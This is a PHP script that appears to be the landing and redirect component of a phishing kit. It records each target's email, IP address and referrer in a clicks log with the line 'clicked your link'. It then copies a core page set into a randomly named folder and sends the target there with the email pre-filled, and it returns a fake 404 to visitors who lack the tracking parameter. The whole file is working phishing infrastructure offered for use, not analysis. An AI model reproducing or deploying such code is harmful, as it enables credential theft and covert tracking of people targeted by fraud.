<?php
session_start();
require_once 'core/inc/check_blocked.php'; 
require_once 'core/inc/functions.php';


$ip = get_client_ip(); $uid = isset($_GET["email"]) ? $_GET["email"] : "No Email"; 
if (isset($_GET['site']) && !empty($_GET['site'])){
	
	$site = base64_decode($_GET['site']);
}
else{
	$site = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : "Unknown";
}
$data ="On ".date('m-d-Y')." user with Email: ".$uid." and IP: ".$ip." clicked your link from ".$site."\r\n";
$file=fopen("./dklem/clicks.txt","a");
	fwrite($file,$data);
	fclose($file);
$core_path = getcwd() . DIRECTORY_SEPARATOR . 'core';


/* Detect auto link */

if (isset($_GET['email'])){
	
		/* START Generate random temp folder name */
		$tmp_folder_name = generateRandomString(5);
		$tmp_path = getcwd() . DIRECTORY_SEPARATOR . $tmp_folder_name;
		$_SESSION['tmp_folder_name'] =  $tmp_folder_name;
		$_SESSION['tmp_folder'] =  $tmp_path;
		$_SESSION['tries'] = 0;

		if (!file_exists($tmp_path)) {
			mkdir($tmp_path, 0777, true);
		}
		/* END Generate random temp folder name */

		/* START Copy files from core dir to temp dir */
		recurse_copy($core_path, $tmp_path);
		
		
		$_SESSION['emtoremove'] = strtolower($_GET['email']);
		/* Redirect to temp path */
		header("refresh:0; url=".$tmp_folder_name."?email=".strtolower($_GET['email']));
}
else{
    header($_SERVER['SERVER_PROTOCOL']." 404 Not Found", true, 404);
			die(getErrorMessage());
}


?>